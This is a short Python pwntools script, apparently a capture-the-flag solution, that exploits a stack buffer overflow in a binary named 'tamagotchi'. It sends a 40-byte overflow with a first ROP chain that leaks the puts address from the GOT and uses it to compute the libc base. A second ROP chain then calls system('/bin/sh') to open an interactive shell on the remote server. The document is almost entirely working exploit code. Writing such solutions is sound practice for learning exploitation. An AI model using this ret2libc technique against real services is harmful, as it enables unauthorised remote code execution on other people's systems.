from pwn import *

context.arch = "amd64"
elf = ELF("./tamagotchi", checksec=False)
libc = ELF("./libc.so", checksec=False) # Libc used by tamagotchi

if args.LOCAL:
    p = elf.process()
else:
    host = args.HOST or "localhost"
    port = int(args.PORT or 8009)
    p = remote(host, port)

offset = 40

# First ROP-chain to leak puts address in libc
rop = ROP(elf)
rop.raw(b"A"*offset)
rop.puts(elf.got["puts"])
rop.call(elf.symbols["feed"])

# Send payload
p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")
p.sendline(rop.chain())
p.recvuntil(b"\n\n")

# Parse the leaked address, and set libc base address
puts_leak = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Puts address found: {hex(puts_leak)}")
libc.address = puts_leak - libc.symbols["puts"]

# Second ROP-chain to get shell on the server
ret_addr = rop.find_gadget(["ret"])[0]
rop = ROP(libc)
rop.raw(b"A"*offset)
rop.raw(p64(ret_addr))
rop.system(next(libc.search(b"/bin/sh")))

# Send payload
p.recvuntil(b">> ")
p.sendline(rop.chain())
p.interactive()
